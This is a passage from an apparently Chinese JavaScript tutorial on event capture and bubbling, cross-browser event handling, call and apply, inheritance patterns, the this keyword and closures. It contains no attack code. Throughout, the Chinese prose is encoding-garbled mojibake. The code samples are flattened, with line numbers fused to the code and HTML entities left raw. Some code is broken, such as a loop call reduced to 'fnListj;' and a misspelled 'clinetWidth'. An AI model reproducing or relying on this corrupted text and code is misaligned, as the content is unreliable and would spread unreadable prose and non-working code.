‡å‡†æ”¯æŒæ•èŽ·åž‹ä¸Žå†’æ³¡åž‹ï¼Œå¯ä»¥è¯´æ˜¯å®ƒä»¬ä¸¤è€…çš„ç»“åˆä½“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªDOMå…ƒç´ ä¸Šç»‘å®šå¤šä¸ªäº‹ä»¶å¤„ç†å™¨ï¼Œå¹¶ä¸”åœ¨å¤„ç†å‡½æ•°å†…éƒ¨ï¼Œthiså…³é”®å­—ä»ç„¶æŒ‡å‘è¢«ç»‘å®šçš„DOMå…ƒç´ ï¼Œå¦å¤–å¤„ç†å‡½æ•°å‚æ•°åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªä½ç½®ä¼ é€’äº‹ä»¶eventå¯¹è±¡ã€‚ é¦–å…ˆæ˜¯æ•èŽ·å¼ä¼ é€’äº‹ä»¶ï¼ŒæŽ¥ç€æ˜¯å†’æ³¡å¼ä¼ é€’ï¼Œæ‰€ä»¥ï¼Œå¦‚æžœä¸€ä¸ªå¤„ç†å‡½æ•°æ—¢æ³¨å†Œäº†æ•èŽ·åž‹äº‹ä»¶çš„ç›‘å¬ï¼Œåˆæ³¨å†Œå†’æ³¡åž‹äº‹ä»¶ç›‘å¬ï¼Œé‚£ä¹ˆåœ¨DOMäº‹ä»¶æ¨¡åž‹ä¸­å®ƒå°±ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ã€‚ å®žä¾‹ï¼š 12345&lt;body&gt; &lt;div&gt; &lt;button&gt;ç‚¹å‡»è¿™é‡Œ&lt;/button&gt; &lt;/div&gt;&lt;/body&gt; å†’æ³¡ï¼šbutton -&gt; div -&gt; body ï¼ˆIE äº‹ä»¶æµï¼‰ æ•èŽ·ï¼šbody -&gt; div -&gt; button ï¼ˆNetscapeäº‹ä»¶æµï¼‰ DOM: body -&gt; div -&gt; button -&gt; button -&gt; div -&gt; bodyï¼ˆå…ˆæ•èŽ·åŽå†’æ³¡ï¼‰ äº‹ä»¶ä¾¦å¬å‡½æ•°çš„åŒºåˆ« 1234567// IEä½¿ç”¨: [Object].attachEvent("name_of_event_handler", fnHandler); //ç»‘å®šå‡½æ•° [Object].detachEvent("name_of_event_handler", fnHandler); //ç§»é™¤ç»‘å®š // DOMä½¿ç”¨ï¼š [Object].addEventListener("name_of_event", fnHandler, bCapture); //ç»‘å®šå‡½æ•° [Object].removeEventListener("name_of_event", fnHandler, bCapture); //ç§»é™¤ç»‘å®š å¦‚ä½•å–æ¶ˆæµè§ˆå™¨äº‹ä»¶çš„ä¼ é€’ä¸Žäº‹ä»¶ä¼ é€’åŽæµè§ˆå™¨çš„é»˜è®¤å¤„ç† å–æ¶ˆäº‹ä»¶ä¼ é€’æ˜¯æŒ‡ï¼Œåœæ­¢æ•èŽ·åž‹äº‹ä»¶æˆ–å†’æ³¡åž‹äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ é€’ã€‚ äº‹ä»¶ä¼ é€’åŽçš„é»˜è®¤å¤„ç†æ˜¯æŒ‡ï¼Œé€šå¸¸æµè§ˆå™¨åœ¨äº‹ä»¶ä¼ é€’å¹¶å¤„ç†å®ŒåŽä¼šæ‰§è¡Œä¸Žè¯¥äº‹ä»¶å…³è”çš„é»˜è®¤åŠ¨ä½œï¼ˆå¦‚æžœå­˜åœ¨è¿™æ ·çš„åŠ¨ä½œï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æžœè¡¨å•ä¸­input type å±žæ€§æ˜¯â€œsubmitâ€ï¼Œç‚¹å‡»åŽåœ¨äº‹ä»¶ä¼ æ’­å®Œæµè§ˆå™¨å°±å°±è‡ªåŠ¨æäº¤è¡¨å•ã€‚åˆä¾‹å¦‚ï¼Œinput å…ƒç´ çš„ keydown äº‹ä»¶å‘ç”Ÿå¹¶å¤„ç†åŽï¼Œæµè§ˆå™¨é»˜è®¤ä¼šå°†ç”¨æˆ·é”®å…¥çš„å­—ç¬¦è‡ªåŠ¨è¿½åŠ åˆ° input å…ƒç´ çš„å€¼ä¸­ã€‚ è¦å–æ¶ˆæµè§ˆå™¨çš„äº‹ä»¶ä¼ é€’,IEä¸ŽDOMæ ‡å‡†åˆæœ‰æ‰€ä¸åŒã€‚ åœ¨IEä¸‹,é€šè¿‡è®¾ç½® event å¯¹è±¡çš„ cancelBubble ä¸º true å³å¯ã€‚ 123function someHandle() &#123; window.event.cancelBubble = true; &#125; DOMæ ‡å‡†é€šè¿‡è°ƒç”¨ eventå¯¹è±¡çš„ stopPropagation() æ–¹æ³•å³å¯ã€‚ 123function someHandle(event) &#123; event.stopPropagation(); &#125; å› äº›ï¼Œè·¨æµè§ˆå™¨çš„åœæ­¢äº‹ä»¶ä¼ é€’çš„æ–¹æ³•æ˜¯: 123456function someHandle(event) &#123; event = event || window.event; if(event.stopPropagation) event.stopPropagation(); else event.cancelBubble = true; &#125; å–æ¶ˆäº‹ä»¶ä¼ é€’åŽçš„é»˜è®¤å¤„ç†ï¼ŒIEä¸ŽDOMæ ‡å‡†åˆä¸æ‰€ä¸åŒã€‚ åœ¨IEä¸‹,é€šè¿‡è®¾ç½® event å¯¹è±¡çš„ returnValue ä¸º false å³å¯ã€‚ 123function someHandle() &#123; window.event.returnValue = false; &#125; å› äº›ï¼Œè·¨æµè§ˆå™¨çš„å–æ¶ˆäº‹ä»¶ä¼ é€’åŽçš„é»˜è®¤å¤„ç†æ–¹æ³•æ˜¯ï¼š 123function someHandle(event) &#123; event.preventDefault(); &#125; IE å’Œæ ‡å‡†ä¸‹æœ‰å“ªäº›å…¼å®¹æ€§çš„å†™æ³•123var ev = ev || window.eventdocument.documentElement.clinetWidth || document.body.clientWidthvar target = ev.srcElement || ev.target call å’Œ apply çš„åŒºåˆ«call å’Œ apply ç›¸åŒç‚¹ï¼šéƒ½æ˜¯ä¸ºäº†ç”¨ä¸€ä¸ªæœ¬ä¸å±žäºŽä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œè®©è¿™ä¸ªå¯¹è±¡åŽ»æ‰§è¡Œ åŸºæœ¬ä½¿ç”¨ call() 1function.call(obj[,arg1[, arg2[, [,.argN]]]]]) è°ƒç”¨callçš„å¯¹è±¡å¿…é¡»æ˜¯ä¸ªå‡½æ•°function callçš„ç¬¬ä¸€ä¸ªå‚æ•°å°†ä¼šæ˜¯functionæ”¹å˜ä¸Šä¸‹æ–‡åŽæŒ‡å‘çš„å¯¹è±¡.å¦‚æžœä¸ä¼ ï¼Œå°†ä¼šé»˜è®¤æ˜¯å…¨å±€å¯¹è±¡window ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹å¯ä»¥æŽ¥æ”¶ä»»æ„ä¸ªå‚æ•°ï¼Œè¿™äº›å‚æ•°å°†ä¼šä½œä¸ºfunctionçš„å‚æ•°ä¼ å…¥function è°ƒç”¨callçš„æ–¹æ³•ä¼šç«‹å³æ‰§è¡Œ apply() 1function.apply(obj[,argArray]) ä¸Žcallæ–¹æ³•çš„ä½¿ç”¨åŸºæœ¬ä¸€è‡´ï¼Œä½†æ˜¯åªæŽ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ç±»æ•°ç»„ï¼Œè¿™ä¹Ÿæ˜¯è¿™ä¸¤ä¸ªæ–¹æ³•å¾ˆé‡è¦çš„ä¸€ä¸ªåŒºåˆ« æ•°ç»„ä¸Žç±»æ•°ç»„å°ç§‘æ™® æ•°ç»„æˆ‘ä»¬éƒ½çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå®ƒçš„ç‰¹å¾éƒ½æœ‰å“ªäº›å‘¢ï¼Ÿ å¯ä»¥é€šè¿‡è§’æ ‡è°ƒç”¨ï¼Œå¦‚ array[0]2. å…·æœ‰é•¿åº¦å±žæ€§length3. å¯ä»¥é€šè¿‡ for å¾ªçŽ¯å’ŒforEachæ–¹æ³•è¿›è¡ŒéåŽ†ç±»æ•°ç»„é¡¾åæ€ä¹‰ï¼Œå…·å¤‡çš„ç‰¹å¾åº”è¯¥ä¸Žæ•°ç»„åŸºæœ¬ç›¸åŒï¼Œé‚£ä¹ˆå¯ä»¥çŸ¥é“ï¼Œä¸€ä¸ªå½¢å¦‚ä¸‹é¢è¿™ä¸ªå¯¹è±¡çš„å¯¹è±¡å°±æ˜¯ä¸€ä¸ªç±»æ•°ç»„ 123456const arrayLike = &#123; 0: 'item1', 1: 'item2', 2: 'item3', length: 3&#125; ç±»æ•°ç»„arrayLikeå¯ä»¥é€šè¿‡è§’æ ‡è¿›è¡Œè°ƒç”¨ï¼Œå…·æœ‰lengthå±žæ€§ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡ for å¾ªçŽ¯è¿›è¡ŒéåŽ† æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„èŽ·å–domèŠ‚ç‚¹çš„æ–¹æ³•è¿”å›žçš„å°±æ˜¯ä¸€ä¸ªç±»æ•°ç»„ï¼Œåœ¨ä¸€ä¸ªæ–¹æ³•ä¸­ä½¿ç”¨ argumentså…³é”®å­—èŽ·å–åˆ°çš„è¯¥æ–¹æ³•çš„æ‰€æœ‰å‚æ•°ä¹Ÿæ˜¯ä¸€ä¸ªç±»æ•°ç»„ ä½†æ˜¯ç±»æ•°ç»„å´ä¸èƒ½é€šè¿‡forEachè¿›è¡ŒéåŽ†ï¼Œå› ä¸ºforEachæ˜¯æ•°ç»„åŽŸåž‹é“¾ä¸Šçš„æ–¹æ³•ï¼Œç±»æ•°ç»„æ¯•ç«Ÿä¸æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ ä¸åŒç‚¹ callæ–¹æ³•ä»Žç¬¬äºŒä¸ªå‚æ•°å¼€å§‹å¯ä»¥æŽ¥æ”¶ä»»æ„ä¸ªå‚æ•°ï¼Œæ¯ä¸ªå‚æ•°ä¼šæ˜ å°„åˆ°ç›¸åº”ä½ç½®çš„funcçš„å‚æ•°ä¸Šï¼Œå¯ä»¥é€šè¿‡å‚æ•°åè°ƒç”¨ï¼Œä½†æ˜¯å¦‚æžœå°†æ‰€æœ‰çš„å‚æ•°ä½œä¸ºæ•°ç»„ä¼ å…¥ï¼Œå®ƒä»¬ä¼šä½œä¸ºä¸€ä¸ªæ•´ä½“æ˜ å°„åˆ°funcå¯¹åº”çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸Šï¼Œä¹‹åŽå‚æ•°éƒ½ä¸ºç©º 1234567function func (a,b,c) &#123;&#125;func.call(obj, 1,2,3)// functionæŽ¥æ”¶åˆ°çš„å‚æ•°å®žé™…ä¸Šæ˜¯ 1,2,3func.call(obj, [1,2,3])// functionæŽ¥æ”¶åˆ°çš„å‚æ•°å®žé™…ä¸Šæ˜¯ [1,2,3],undefined,undefined applyæ–¹æ³•æœ€å¤šåªæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æŽ¥æ”¶æ•°ç»„æˆ–è€…ç±»æ•°ç»„ï¼Œä½†æ˜¯éƒ½ä¼šè¢«è½¬æ¢æˆç±»æ•°ç»„ä¼ å…¥funcä¸­ï¼Œå¹¶ä¸”ä¼šè¢«æ˜ å°„åˆ°funcå¯¹åº”çš„å‚æ•°ä¸Š 12345678910func.apply(obj, [1,2,3])// functionæŽ¥æ”¶åˆ°çš„å‚æ•°å®žé™…ä¸Šæ˜¯ 1,2,3func.apply(obj, &#123; 0: 1, 1: 2, 2: 3, length: 3&#125;)// functionæŽ¥æ”¶åˆ°çš„å‚æ•°å®žé™…ä¸Šæ˜¯ 1,2,3 b ç»§æ‰¿ a çš„æ–¹æ³•æ–¹æ³•ä¸€ï¼šå¯¹è±¡å†’å…… 123456789101112131415161718192021function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125;&#125;function Child(username,password)&#123; this.method = Parent; // this.method ä½œä¸ºä¸€ä¸ªä¸´æ—¶çš„å±žæ€§ï¼Œå¹¶ä¸”æŒ‡å‘äº† Parentæ‰€æŒ‡å‘çš„å¯¹è±¡å‡½æ•° this.method(username); // æ‰§è¡Œ this.method æ–¹æ³•ï¼Œå³æ‰§è¡Œäº† Parent æ‰€æŒ‡å‘çš„å¯¹è±¡å‡½æ•° delete this.method; // é”€æ¯ this.method å±žæ€§ï¼Œå³æ­¤æ—¶ Child å°±å·²ç»æ‹¥æœ‰äº† Parent çš„æ‰€æœ‰æ–¹æ³•å’Œå±žæ€§ this.password = password; this.world = function()&#123; console.log(this.password); &#125;&#125;const parent = new Parent('hello parent');const child = new Child('hello child','123456');console.log(child);parent.hello();child.hello();child.world(); æ–¹æ³•äºŒï¼šcall() call æ–¹æ³•æ˜¯ Function ç±»ä¸­çš„æ–¹æ³•call æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼èµ‹å€¼ç»™ç±»ï¼ˆå³æ–¹æ³•ï¼‰ä¸­å‡ºçŽ°çš„ thiscall æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹ä¾æ¬¡èµ‹å€¼ç»™ç±»ï¼ˆå³æ–¹æ³•ï¼‰æ‰€æŽ¥å—çš„å‚æ•° 123456789101112131415161718function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125;&#125;function Child(username,password)&#123; Parent.call(this,username); this.password = password; this.world = function()&#123; console.log(this.password); &#125;&#125;const parent = new Parent('hello parent');const child = new Child('hello child','123456');parent.hello();child.hello();child.world(); æ–¹æ³•ä¸‰ï¼šapply() applyæ–¹æ³•æŽ¥å—2ä¸ªå‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°ä¸Žcallæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·ï¼Œå³èµ‹å€¼ç»™ç±»ï¼ˆå³æ–¹æ³•ï¼‰ä¸­å‡ºçŽ°çš„this ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ•°ç»„ç±»åž‹ï¼Œè¿™ä¸ªæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ä¾æ¬¡èµ‹å€¼ç»™ç±»ï¼ˆå³æ–¹æ³•ï¼‰æ‰€æŽ¥å—çš„å‚æ•° 123456789101112131415161718function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125;&#125;function Child(username,password)&#123; Parent.apply(this,new Array(username)); this.password = password; this.world = function()&#123; console.log(this.password); &#125;&#125;const parent = new Parent('hello parent');const child = new Child('hello child','123456');parent.hello();child.hello();child.world(); æ–¹æ³•å››ï¼šåŽŸåž‹é“¾ å³å­ç±»é€šè¿‡ prototype å°†æ‰€æœ‰åœ¨çˆ¶ç±»ä¸­é€šè¿‡ prototype è¿½åŠ çš„å±žæ€§å’Œæ–¹æ³•éƒ½è¿½åŠ åˆ° Child ,ä»Žè€Œå®žçŽ°ç»§æ‰¿ 1234567891011121314function Parent()&#123;&#125;Parent.prototype.hello = "hello";Parent.prototype.sayHello = function()&#123; console.log(this.hello);&#125;function Child()&#123;&#125;Child.prototype = new Parent();// å°† Parent ä¸­æ‰€æœ‰é€šè¿‡ prototype è¿½åŠ çš„å±žæ€§å’Œæ–¹æ³•éƒ½è¿½åŠ åˆ° Child ä»Žè€Œå®žçŽ°äº†ç»§æ‰¿Child.prototype.world = "world";Child.prototype.sayWorld = function()&#123; console.log(this.world);&#125;const child = new Child();child.sayHello();child.sayWorld(); æ–¹æ³•äº”ï¼šæ··åˆæ–¹å¼ï¼Œcallï¼ˆï¼‰+ åŽŸåž‹é“¾ 1234567891011121314151617function Parent(hello)&#123; this.hello = hello;&#125;Parent.prototype.sayHello = function()&#123; console.log(this.hello);&#125;function Child(hello,world)&#123; Parent.call(this,hello); // å°†çˆ¶ç±»çš„å±žæ€§ç»§æ‰¿è¿‡æ¥ this.world = world;&#125;Child.prototype = new Parent(); //å°†çˆ¶ç±»çš„æ–¹æ³•ç»§æ‰¿è¿‡æ¥Child.prototype.sayWorld = function()&#123; // æ–°å¢žæ–¹æ³• console.log(this.world);&#125;const child = new Child("hello","world");child.sayHello();child.sayWorld(); JavaScript this æŒ‡é’ˆã€é—­åŒ…ã€ä½œç”¨åŸŸjs ä¸­çš„this æŒ‡é’ˆ åœ¨å‡½æ•°æ‰§è¡Œæ—¶ï¼Œthis æ€»æ˜¯æŒ‡å‘è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚è¦åˆ¤æ–­ this çš„æŒ‡å‘ï¼Œå…¶å®žå°±æ˜¯åˆ¤æ–­ this æ‰€åœ¨çš„å‡½æ•°å±žäºŽè°ã€‚ åœ¨ã€ŠjavaScriptè¯­è¨€ç²¾ç²¹ã€‹è¿™æœ¬ä¹¦ä¸­ï¼ŒæŠŠ this å‡ºçŽ°çš„åœºæ™¯åˆ†ä¸ºå››ç±»ï¼Œç®€å•çš„è¯´å°±æ˜¯ï¼š 1ï¼‰æœ‰å¯¹è±¡å°±æŒ‡å‘è°ƒç”¨å¯¹è±¡ 123456var myObject = &#123; value: 123 &#125;myObject.getValue = function()&#123; console.log(this.value); // 123 console.log(this); // &#123;value: 123, getValue: Æ’&#125;&#125;myObject.getValue(); 2ï¼‰æ²¡è°ƒç”¨å¯¹è±¡å°±æŒ‡å‘å…¨å±€å¯¹è±¡ 123456789101112var myObject = &#123; value: 123 &#125;myObject.getValue = function()&#123; var foo = function()&#123; console.log(this.value); // undefined console.log(this); // Window &#123;postMessage: Æ’, blur: Æ’, focus: Æ’, close: Æ’, frames: Window, â€¦&#125; // fooå‡½æ•°è™½ç„¶å®šä¹‰åœ¨getValue å‡½æ•°ä½“å†…ï¼Œä½†æ˜¯ä¸å±žäºŽ getValueä¹Ÿä¸å±žäºŽ myObject,æ‰€ä»¥è°ƒç”¨çš„æ—¶å€™ï¼Œå®ƒçš„ this æŒ‡é’ˆæŒ‡å‘äº†å…¨å±€å¯¹è±¡ &#125; foo(); return this.value;&#125;console.log(myObject.getValue()); // 123 3) ç”¨newæž„é€ å°±æŒ‡å‘æ–°å¯¹è±¡ 123456// js ä¸­é€šè¿‡ new å…³é”®è¯æ¥è°ƒç”¨æž„é€ å‡½æ•°ï¼Œæ­¤æ—¶ this ä¼šç»‘å®šæ‚è¯¥æ–°å¯¹è±¡ä¸Švar someClass = function()&#123; this.value = 123;&#125;var myCreate = new someClass();console.log(myCreate.value); // 123 4ï¼‰é€šè¿‡ apply æˆ– call æˆ– bind æ¥æ”¹å˜ this çš„æŒ‡å‘ 123456789var myObject = &#123; value: 123 &#125;;var foo = function()&#123; console.log(this);&#125;foo(); // Window &#123;postMessage: Æ’, blur: Æ’, focus: Æ’, close: Æ’, frames: Window, â€¦&#125;foo.apply(myObject); // &#123;value: 123&#125;foo.call(myObject); // &#123;value: 123&#125;var newFoo = foo.bind(myObject);newFoo(); // &#123;value: 123&#125; é—­åŒ…é—­åŒ…è‹±æ–‡æ˜¯ Closure ï¼Œç®€è€Œè¨€ä¹‹ï¼Œé—­åŒ…å°±æ˜¯ å‡½æ•°çš„å±€éƒ¨é›†åˆï¼Œåªæ˜¯è¿™äº›å±€éƒ¨å˜é‡åœ¨å‡½æ•°è¿”å›žåŽä¼šç»§ç»­å­˜åœ¨ å‡½æ•°çš„â€œå †æ ˆâ€åœ¨å‡½æ•°è¿”å›žåŽå¹¶ä¸é‡Šæ”¾ï¼Œå¯ä»¥ç†è§£ä¸ºè¿™äº›å‡½æ•°å †æ ˆå¹¶ä¸åœ¨æ ˆä¸Šåˆ†é…è€Œæ˜¯åœ¨å †ä¸Šåˆ†é… å½“åœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨å®šä¹‰å¦å¤–ä¸€ä¸ªå‡½æ•°å°±ä¼šäº§ç”Ÿé—­åŒ… ä½œä¸ºå±€éƒ¨å˜é‡éƒ½å¯ä»¥è¢«å‡½æ•°å†…çš„ä»£ç è®¿é—®ï¼Œè¿™ä¸ªå’Œé™æ€è¯­è¨€æ˜¯æ²¡æœ‰å·®åˆ«çš„ï¼Œé—­åŒ…çš„å·®åˆ«åœ¨äºŽå±€éƒ¨å˜é‡å¯ä»¥åœ¨å‡½æ•°æ‰§è¡Œç»“æŸåŽä»ç„¶è¢«å‡½æ•°å¤–çš„ä»£ç è®¿é—®ï¼Œè¿™æ„å‘³ç€å‡½æ•°å¿…é¡»è¿”å›žä¸€ä¸ªæŒ‡å‘é—­åŒ…çš„â€œå¼•ç”¨â€ï¼Œæˆ–å°†è¿™ä¸ªâ€œå¼•ç”¨â€èµ‹å€¼ç»™æŸä¸ªå¤–éƒ¨å˜é‡ï¼Œæ‰èƒ½ä¿è¯é—­åŒ…ä¸­å±€éƒ¨å˜é‡è¢«å¤–éƒ¨ä»£ç è®¿é—®ï¼Œå½“ç„¶åŒ…å«è¿™ä¸ªå¼•ç”¨çš„å®žä½“åº”è¯¥æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚ä½†æ˜¯ESå¹¶æ²¡æœ‰æä¾›ç›¸å…³çš„æˆå‘˜å’Œæ–¹æ³•æ¥è®¿é—®åŒ…ä¸­çš„å±€éƒ¨å˜é‡ï¼Œä½†æ˜¯åœ¨ESä¸­ï¼Œå‡½æ•°å¯¹è±¡ä¸­å®šä¹‰çš„å†…éƒ¨å‡½æ•°æ˜¯å¯ä»¥ç›´æŽ¥è®¿é—®å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œé€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼å®Œæˆå¯¹é—­åŒ…çš„è®¿é—®ã€‚ 12345678910function greeting(name)&#123; var text = "Hello " + name; // å±€éƒ¨å˜é‡ // æ¯æ¬¡è°ƒç”¨æ—¶ï¼Œäº§ç”Ÿé—­åŒ…ï¼Œå¹¶è¿”å›žå†…éƒ¨å‡½æ•°å¯¹è±¡ç»™è°ƒç”¨è€… return function()&#123; console.log(text); &#125;&#125;var sayHello = greeting('Closure');// é€šè¿‡é—­åŒ…è®¿é—®åˆ°äº†å±€éƒ¨å˜é‡textsayHello(); // è¾“å‡ºHello Closure åœ¨ ECMAscript çš„è„šæœ¬å‡½æ•°è¿è¡Œæ—¶ï¼Œæ¯ä¸ªå‡½æ•°å…³è”éƒ½æœ‰ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡åœºæ™¯ï¼ˆExection Contextï¼‰ï¼Œè¿™ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ† æ–‡æ³•çŽ¯å¢ƒï¼ˆThe LexicalEnvironmentï¼‰ å˜é‡çŽ¯å¢ƒï¼ˆThe VariableEnvironmentï¼‰ thisç»‘å®š å…¶ä¸­ç¬¬ä¸‰ç‚¹thisç»‘å®šä¸Žé—­åŒ…æ— å…³ï¼Œä¸åœ¨æœ¬æ–‡ä¸­è®¨è®ºã€‚æ–‡æ³•çŽ¯å¢ƒä¸­ç”¨äºŽè§£æžå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä½¿ç”¨åˆ°çš„å˜é‡æ ‡è¯†ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥å°†æ–‡æ³•çŽ¯å¢ƒæƒ³è±¡æˆä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å«äº†ä¸¤ä¸ªé‡è¦ç»„ä»¶ï¼ŒçŽ¯å¢ƒè®°å½•(Enviroment Recode)ï¼Œå’Œå¤–éƒ¨å¼•ç”¨(æŒ‡é’ˆ)ã€‚çŽ¯å¢ƒè®°å½•åŒ…å«åŒ…å«äº†å‡½æ•°å†…éƒ¨å£°æ˜Žçš„å±€éƒ¨å˜é‡å’Œå‚æ•°å˜é‡ï¼Œå¤–éƒ¨å¼•ç”¨æŒ‡å‘äº†å¤–éƒ¨å‡½æ•°å¯¹è±¡çš„ä¸Šä¸‹æ–‡æ‰§è¡Œåœºæ™¯ã€‚å…¨å±€çš„ä¸Šä¸‹æ–‡åœºæ™¯ä¸­æ­¤å¼•ç”¨å€¼ä¸ºNULLã€‚è¿™æ ·çš„æ•°æ®ç»“æž„å°±æž„æˆäº†ä¸€ä¸ªå•å‘çš„é“¾è¡¨ï¼Œæ¯ä¸ªå¼•ç”¨éƒ½æŒ‡å‘å¤–å±‚çš„ä¸Šä¸‹æ–‡åœºæ™¯ã€‚ ä¾‹å¦‚ä¸Šé¢æˆ‘ä»¬ä¾‹å­çš„é—­åŒ…æ¨¡åž‹åº”è¯¥æ˜¯è¿™æ ·ï¼ŒsayHelloå‡½æ•°åœ¨æœ€ä¸‹å±‚ï¼Œä¸Šå±‚æ˜¯å‡½æ•°greetingï¼Œæœ€å¤–å±‚æ˜¯å…¨å±€åœºæ™¯ã€‚å¦‚ä¸‹å›¾ï¼š å› æ­¤å½“sayHelloè¢«è°ƒç”¨çš„æ—¶å€™ï¼ŒsayHelloä¼šé€šè¿‡ä¸Šä¸‹æ–‡åœºæ™¯æ‰¾åˆ°å±€éƒ¨å˜é‡textçš„å€¼ï¼Œå› æ­¤åœ¨å±å¹•çš„å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºå‡ºâ€Hello Closureâ€ é’ˆå¯¹ä¸€äº›ä¾‹å­æ¥å¸®åŠ©å¤§å®¶æ›´åŠ æ·±å…¥çš„ç†è§£é—­åŒ…,ä¸‹é¢å…±æœ‰5ä¸ªæ ·ä¾‹ï¼Œä¾‹å­æ¥è‡ªäºŽJavaScript Closures For Dummies(é•œåƒ)ã€‚ ä¾‹å­1:é—­åŒ…ä¸­å±€éƒ¨å˜é‡æ˜¯å¼•ç”¨è€Œéžæ‹·è´ 12345678910function say667()&#123; var num = 666; var sayConsole = function()&#123; console.log(num); &#125; num++; return sayConsole;&#125;var sayConsole = say667();sayConsole(); // 667 ä¾‹å­2ï¼šå¤šä¸ªå‡½æ•°ç»‘å®šåŒä¸€ä¸ªé—­åŒ…ï¼Œå› ä¸ºä»–ä»¬å®šä¹‰åœ¨åŒä¸€ä¸ªå‡½æ•°å†…ã€‚ 123456789101112function setupSomeGlobals()&#123; var num = 666; gConsoleNumber = function() &#123; console.log(num); &#125; gIncreaseNumber = function() &#123; num++; &#125; gSetNumber = function(x) &#123; num = x; &#125;&#125;setupSomeGlobals();gConsoleNumber(); // 666gIncreaseNumber();gConsoleNumber(); // 667gSetNumber(12);gConsoleNumber(); // 12 ä¾‹å­3ï¼šå½“åœ¨ä¸€ä¸ªå¾ªçŽ¯ä¸­èµ‹å€¼å‡½æ•°æ—¶ï¼Œè¿™äº›å‡½æ•°å°†ç»‘å®šåŒæ ·çš„é—­åŒ… 1234567891011121314151617function buildList(list)&#123; var result = []; for(var i = 0; i &lt; list.length; i++)&#123; var item = 'item' + list[i]; result.push(function()&#123; console.log(item+' '+list[i]); &#125;) &#125; return result;&#125;function testList()&#123; var fnList = buildList([1,2,3]); for(var j = 0; j &lt; fnList.length; j++)&#123; fnListj; &#125;&#125;testList(); // è¾“å‡º3æ¬¡ item3 undefined testListçš„æ‰§è¡Œç»“æžœæ˜¯å¼¹å‡ºitem3 undefinedçª—å£ä¸‰æ¬¡ï¼Œå› ä¸ºè¿™ä¸‰ä¸ªå‡½æ•°ç»‘å®šäº†åŒä¸€ä¸ªé—­åŒ…ï¼Œè€Œä¸”itemçš„å€¼ä¸ºæœ€åŽè®¡ç®—çš„ç»“æžœï¼Œä½†æ˜¯å½“iè·³å‡ºå¾ªçŽ¯æ—¶iå€¼ä¸º4ï¼Œæ‰€ä»¥list[4]çš„ç»“æžœä¸ºundefined. ä¾‹å­4ï¼šå¤–éƒ¨å‡½æ•°æ‰€æœ‰å±€éƒ¨å˜é‡éƒ½åœ¨é—­åŒ…å†…ï¼Œå³ä½¿è¿™ä¸ªå˜é‡å£°æ˜Žåœ¨å†…éƒ¨å‡½æ•°å®šä¹‰ä¹‹åŽã€‚ 123456789function sayAlice()&#123; var sayConsole = function()&#123; console.log(alice); &#125; var alice = "Hello Alice"; return sayConsole;&#125;var helloAlice=sayAlice();helloAlice(); æ‰§è¡Œç»“æžœè¾“å‡ºâ€Hello Aliceâ€çš„çª—å£ã€‚å³ä½¿å±€éƒ¨å˜é‡å£°æ˜Žåœ¨å‡½æ•°sayAlertä¹‹åŽï¼Œå±€éƒ¨å˜é‡ä»ç„¶å¯ä»¥è¢«è®¿é—®åˆ°ã€‚ ä¾‹å­5ï¼šæ¯æ¬¡å‡½æ•°è°ƒç”¨çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªæ–°çš„é—­åŒ… 12345678910111213141516function newClosure(someNum,someRef)&#123; var num = someNum; var anArray = [1,2,3]; var ref = someRef; return function(x)&#123; num += x; anArray.push(num); console.log('num: ' + num +'\nanArray ' + anArray.toString() +'\nref.someVar ' + ref.someVar); &#125;&#125;closure1=newClosure(40,&#123;someVar:'closure 1'&#125;);closure2=newClosure(1000,&#123;someVar:'closure 2'&#125;);closure1(5); // num: 45 anArray 1,2,3,45 ref.someVar closure 1closure2(-10); // num: 990 anArray 1,2,3,990 ref.someVar closure 2 é—­åŒ…çš„ç¼ºç‚¹ï¼šï¼ˆ1ï¼‰ç”±äºŽé—­åŒ…ä¼šä½¿å¾—å‡½æ•°ä¸­çš„å˜é‡éƒ½è¢«ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå†…å­˜æ¶ˆè€—å¾ˆå¤§ï¼Œæ‰€ä»¥ä¸èƒ½æ»¥ç”¨é—­åŒ…ï¼Œå¦åˆ™ä¼šé€ 